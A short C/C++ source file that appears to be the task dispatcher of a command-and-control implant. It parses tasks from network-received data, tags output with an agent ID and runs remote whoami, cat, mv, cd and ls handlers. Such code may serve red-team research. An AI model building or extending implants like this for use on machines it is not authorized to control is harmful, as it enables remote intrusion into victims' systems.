#include "../../includes/core/core.h"
#include "../../includes/net/net.h"
#include "../../includes/byte/byte.h"
#include "../../includes/core/tasker.h"
#include "../../includes/core/tasker/filesystem.h"
#include "../../includes/core/tasker/tokens.h"


typedef struct {
	INT32 Code;
	void (*Run)();
} TaskHandler;

static const TaskHandler TaskHandlers[] = {
	{ TASK_WHOAMI, do_whoami },
	{ TASK_CAT,    do_cat    },
	{ TASK_MV,     do_mv     },
	{ TASK_CD,     do_cd     },
	{ TASK_LS,     do_ls     },
};


BOOL Dispatch() {
	packager->NewParser(g_NetMgr->RecvBuf(), g_NetMgr->RecvSize());
	INT32 TotalTasks = packager->Parse4();
	if (TotalTasks <= 0) {
		DEBUG_LOGA("[!] No Task");
		return TRUE;
	}
	packager->Pack4(MSG_OUTPUT);
	packager->Pack4(hollow->config->AgentID);
	packager->Pack4(TotalTasks);
	for (INT i = 0; i < TotalTasks; i++) {
		INT32 Code = packager->Parse4();
		for (const TaskHandler& Task : TaskHandlers) {
			if (Task.Code != Code) {
				continue;
			}
			Task.Run();
			break;
		}
	}
	return TRUE;
}
